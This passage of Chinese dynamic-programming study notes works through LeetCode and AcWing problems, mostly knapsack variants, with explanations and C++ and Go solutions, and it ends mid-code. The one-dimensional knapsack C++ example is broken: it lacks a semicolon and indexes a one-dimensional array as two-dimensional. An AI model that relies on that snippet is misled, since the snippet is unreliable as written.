&lt;li&gt;确定遍历顺序&lt;/li&gt;
&lt;li&gt;举例推导dp数组&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;简单动规题&#34;&gt;简单动规题&lt;/h1&gt;
&lt;h2 id=&#34;斐波那契数列&#34;&gt;斐波那契数列&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/fibonacci-number/&lt;/p&gt;
&lt;h2 id=&#34;爬楼梯&#34;&gt;爬楼梯&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/climbing-stairs/&lt;/p&gt;
&lt;h2 id=&#34;最小花费爬楼梯&#34;&gt;最小花费爬楼梯&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/min-cost-climbing-stairs/submissions/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int minCostClimbingStairs(vector&amp;lt;int&amp;gt;&amp;amp; cost) {
        int dp[1005];
        dp[0] = 0;
        dp[1] = 0;
        for (int i = 2; i &amp;lt;= cost.size(); i ++ ) {
            dp[i] = min(dp[i - 1] + cost[i - 1], dp[i - 2] + cost[i - 2]);
        }
        return dp[cost.size()];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;不同路径&#34;&gt;不同路径&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/unique-paths/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int uniquePaths(int m, int n) {
        int dp[101][101];
        for (int i = 0; i &amp;lt;= m; i ++) {
            dp[0][i] = 0;
            dp[i][0] = 0;
        }
        for (int i = 1; i &amp;lt;= m; i ++) {
            for (int j = 1; j &amp;lt;= n; j ++) {
                if (i == 1 &amp;amp;&amp;amp; j == 1) 
                    dp[i][j] = 1;
                else
                    dp[i][j] = dp[i-1][j] + dp[i][j-1];
            }
        }
        return dp[m][n];

    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;不同路径2&#34;&gt;不同路径2&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/unique-paths-ii/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int uniquePathsWithObstacles(vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt;&amp;amp; obstacleGrid) {
        if (obstacleGrid[0][0] == 1) return 0;
        int m = obstacleGrid.size();
        int n = obstacleGrid[0].size();
        int dp[101][101];
        for (int i = 0; i &amp;lt;= m; i ++) {
            dp[0][i] = 0;
            dp[i][0] = 0;
        }
        for (int i = 0; i &amp;lt; m; i ++) {
            for (int j = 0; j &amp;lt; n; j ++) {
                if (i == 0 &amp;amp;&amp;amp; j == 0) 
                    dp[i + 1][j + 1] = 1;
                else if (obstacleGrid[i][j] == 1) 
                    dp[i + 1][j + 1] = 0;
                else if (i == 0 || obstacleGrid[i - 1][j] == 1)
                    dp[i + 1][j + 1] = dp[i + 1][j];
                else if (j == 0 || obstacleGrid[i][j - 1] == 1)
                    dp[i + 1][j + 1] = dp[i][j + 1];
                else
                    dp[i + 1][j + 1] = dp[i][j + 1] + dp[i + 1][j];
            }
        }
        return dp[m][n];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;整数拆分&#34;&gt;整数拆分※&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/integer-break/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int integerBreak(int n) {
        int dp[60]; // dp[i] 表示i拆分后乘积的最大值
        memset(dp, 0, sizeof(dp));
        dp[2] = 1;
        for (int i = 3; i &amp;lt;= n; i ++) {
            for (int j = 1; j &amp;lt; i - 1; j ++) {
                dp[i] = max(dp[i], max((i - j) * j, dp[i - j] * j));
                // 对于i，将其拆分两个数-&amp;gt; j, (i-j)
                // 拆分成多个数-&amp;gt; j, dp[i-j]
                // 最大值可能是拆分成两个数，也可能拆分成多个数，例如3，可以拆分成1，2，也可以是1，1，1，显然1，2的乘积最大。
            }
        }
        return dp[n];
    }
};

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;不同的二叉搜索树&#34;&gt;不同的二叉搜索树※&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/unique-binary-search-trees/submissions/&lt;/p&gt;
&lt;p&gt;这道题有些难度，需要总结推理一下。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://camo.githubusercontent.com/bf3fdc435d1771942205a97a1f754dc39498dc2cce5886a429b2f113028e70b4/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303130373039333132393838392e706e67&#34; alt=&#34;96.不同的二叉搜索树1&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当n=3时：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当1作为根，那么其右子树的种类和n=2时的情况一样；&lt;/li&gt;
&lt;li&gt;当2作为根，那么其左右子树的种类和n=1时的情况一样；&lt;/li&gt;
&lt;li&gt;当3作为根，那么其左子树的种类和n=1时的情况一样。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以当n=m时：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将1作为根，那么其右子树的种类和n=m-1时的情况一样；&lt;/li&gt;
&lt;li&gt;将2作为根，那么其左子树的种类和n=1时的一样，右子树的种类和n=m-2时的一样，左右子树情况相乘；&lt;/li&gt;
&lt;li&gt;将3作为根，那么其左子树的种类和n=2时的一样，右子树的种类和n=m-3时的一样，左右子树情况相乘；&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;li&gt;将m作为根，那么其左子树的种类和n=m-1时的情况一样。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可以推出递推公式：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;dp[n] = dp[n-1]*dp[0] + dp[n-2]*dp[1] + dp[n-3]*dp[2] + ... +dp[0]*dp[n-1]
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int numTrees(int n) {
        int dp[20];
        memset(dp, 0, sizeof(dp));
        dp[0] = 1;
        for (int i = 1; i &amp;lt;= n; i++) {
            for (int j = 1; j &amp;lt;= i; j++) {
                dp[i] += dp[i - j] * dp[j - 1];
            }
        }
        return dp[n];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;背包问题&#34;&gt;背包问题&lt;/h1&gt;
&lt;p&gt;背包问题基本上搞懂01背包，完全背包就差不多够了，最多再加上一个完全背包，其他的背包问题都是竞赛级别的了。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://camo.githubusercontent.com/5c5af3f54a3503cdb989ab1c28e2933202a33259608c70af0e72db5a858f14e6/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303131373137313330373430372e706e67&#34; alt=&#34;416.分割等和子集1&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;01背包&#34;&gt;01背包&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/2/&lt;/p&gt;
&lt;p&gt;01背包就是将1~n物品中若干个装进容量为W的背包中，每件物品的重量为weight[i]，价值为value[i]。&lt;/p&gt;
&lt;h3 id=&#34;二维dp&#34;&gt;二维dp&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;dp[i][j]&lt;/code&gt;表示前i件装进背包容量为j的背包中的最大价值，可以有两个方向去推出&lt;code&gt;dp[i][j]&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不放当前第i个物品，即&lt;code&gt;dp[i][j] = dp[i-1][j]&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;放当前第i个物品，即&lt;code&gt;dp[i][j] = dp[i-1][j-wight[i]] + value[i]&lt;/code&gt;，如果放第i个物品，那么需要为背包腾出wight[i]为位置，即&lt;code&gt;j-wight[i]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以递推公式为：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dp[i][j] = max(dp[i-1][j], dp[i-1][j-weight[i]] + value[i])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;初始化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dp[i][0] = 0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;j&amp;lt;weight[0]&lt;/code&gt;，也就是当背包容量小于最小物品时，&lt;code&gt;dp[0][j]=0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;j&amp;gt;=weight[0]&lt;/code&gt;，&lt;code&gt;dp[0][j] =  value[0]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

const int N = 1005;

int main() {
    int n, v;
    int dp[N][N];
    int weight[N];
    int value[N];
    memset(dp, 0, sizeof(dp));
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v);
    for (int i = 0; i &amp;lt; n; i ++) {
        scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i]);
    }
    
    for (int j = weight[0]; j &amp;lt;= v; j ++) {
        dp[0][j] = value[0];
    }
    
    for (int i = 1; i &amp;lt; n; i++) {
        for (int j = 0; j &amp;lt;= v; j++) {
            if(j &amp;gt;= weight[i])
                dp[i][j] = max(dp[i - 1][j], dp[i - 1][j - weight[i]] + value[i]);
            else
                dp[i][j] = dp[i - 1][j];
        }
    }
    cout &amp;lt;&amp;lt; dp[n - 1][v];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;一维dp&#34;&gt;一维dp&lt;/h3&gt;
&lt;p&gt;从二维dp的递推公式中可以看出每次迭代都与前一行有关，其实可以将i-1行叠加到i行，那么就可以只用一个数组。&lt;/p&gt;
&lt;p&gt;一维dp[j]的含义时，容量为j的背包，最大价值是dp[j]。&lt;/p&gt;
&lt;p&gt;此时递推公式：&lt;code&gt;dp[j] = max(dp[j], dp[j-weight[i]] + value[i])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;初始化：如果所有的价值都是正数，那么可以全部初始化为0。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

const int N = 1005;

int main() {
    int n, v;
    int dp[N];
    int weight[N];
    int value[N];
    memset(dp, 0, sizeof(dp));
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v);
    for (int i = 0; i &amp;lt; n; i ++) {
        scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i]);
    }
    
    for (int i = 0; i &amp;lt; n; i++) {
        for (int j = v; j &amp;gt;= weight[i]; j--) {
            dp[j] = max(dp[j], dp[j-weight[i]] + value[i])
        }
    }
    cout &amp;lt;&amp;lt; dp[n - 1][v];
}



// go
package main

import &amp;quot;fmt&amp;quot;

func max(x, y int) int {
	if x &amp;gt; y {
		return x
	}
	return y
}

func main() {
	var n, v int
	var weight, value []int
	var dp []int
	fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v)

	for i := 0; i &amp;lt; n; i++ {
		weight = append(weight, 0)
		value = append(value, 0)
		fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i])
	}

	for i := 0; i &amp;lt;= v; i++ {
		dp = append(dp, 0)
	}

	for i := 0; i &amp;lt; n; i++ {
		for j := v; j &amp;gt;= weight[i]; j-- {
			dp[j] = max(dp[j], dp[j - weight[i]] + value[i])
		}
	}
	fmt.Printf(&amp;quot;%v\n&amp;quot;, dp)
	fmt.Println(dp)
	fmt.Printf(&amp;quot;%d\n&amp;quot;, dp[v])
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一维dp的迭代写法和二维dp的写法是不一样的，二维dp遍历的时候，背包容量是从小到大的，而一维dp遍历的时候，背包是从大到小的。这是因为倒序是为了保证物品i只被放入一次。&lt;/p&gt;
&lt;h3 id=&#34;分割等和子集&#34;&gt;分割等和子集&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/partition-equal-subset-sum/&lt;/p&gt;
&lt;p&gt;这道题看似是回溯搜索问题，但其实是背包问题，问题可以转化为找到一个子集，该子集中元素的和为整个数组的和的一半，找子集的过程其实就是一个01背包问题，只不过每个元素的weight和value值相等，对于每个元素只有取和不取两个选择，背包容量就是sum/2。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool canPartition(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        int sum = 0;
        
        for (int i = 0; i &amp;lt; nums.size(); i ++) {
            sum += nums[i];
        }
        if(sum % 2 != 0) return false;
        
        vector&amp;lt;int&amp;gt; dp(sum / 2 + 1, 0);
        
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            for (int j = sum / 2; j &amp;gt;= nums[i]; j--) {
                dp[j] = max(dp[j], dp[j - nums[i]] + nums[i]);
            }
        }
        
        if (dp[sum / 2] == sum / 2) 
            return true;
        
        return false;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;最后一块石头的重量-ii&#34;&gt;最后一块石头的重量 II&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/last-stone-weight-ii/&lt;/p&gt;
&lt;p&gt;这道题其实就是尽量让石头分成重量尽可能相近相同的两堆，这样两堆之间相撞之后剩下的石头最小，结果就是两堆的差值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func lastStoneWeightII(stones []int) int {
    var dp [3005] int
    var sum int = 0

    for i := 0; i &amp;lt; len(stones); i++ {
        sum += stones[i]
    }

    for i := 0; i &amp;lt; len(stones); i++ {
        for j := sum / 2; j &amp;gt;= stones[i]; j-- {
            dp[j] = max(dp[j], dp[j - stones[i]] + stones[i])
        }
    }

    return sum - dp[sum / 2] * 2
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;一和零&#34;&gt;一和零&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/ones-and-zeroes/&lt;/p&gt;
&lt;p&gt;这道题其实是01背包问题，只不过是二维的01背包，可以想成有两个背包，每次选一个物品，两个背包都会减去相应的容量。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int findMaxForm(vector&amp;lt;string&amp;gt;&amp;amp; strs, int m, int n) {
        int dp[101][101];
        memset(dp, 0, sizeof(dp));
        for (int i = 0; i &amp;lt; strs.size(); i ++) {
            int zero = 0;
            for (int j = 0; j &amp;lt; strs[i].length(); j++) {
                if (strs[i][j] == &#39;0&#39;) zero ++;
            }
            int one = strs[i].length() - zero;
            for (int j = m; j &amp;gt;= zero; j--) {
                for (int k = n; k &amp;gt;= one; k--) {
                    dp [j][k] = max(dp[j][k], dp[j - zero][k - one] + 1);
                }
            }
        }
        return dp[m][n];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;目标和&#34;&gt;目标和※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/target-sum/&lt;/p&gt;
&lt;p&gt;假设加法的总和为x，那么减法对应的总和就是sum-x，所以要求&lt;code&gt;x-(sum-x)=target，x = (target + sum) / 2&lt;/code&gt;，问题转化为了选择若干个数，和为x，其实转化为一个组合问题。&lt;/p&gt;
&lt;p&gt;同时注意如果target + sum为奇数则没有解，target&amp;gt;sum也没有解。&lt;/p&gt;
&lt;p&gt;对于所有组合问题，背包的递推：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;dp[j] += dp[j-nums[i]]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int findTargetSumWays(vector&amp;lt;int&amp;gt;&amp;amp; nums, int S) {
        int sum = 0;
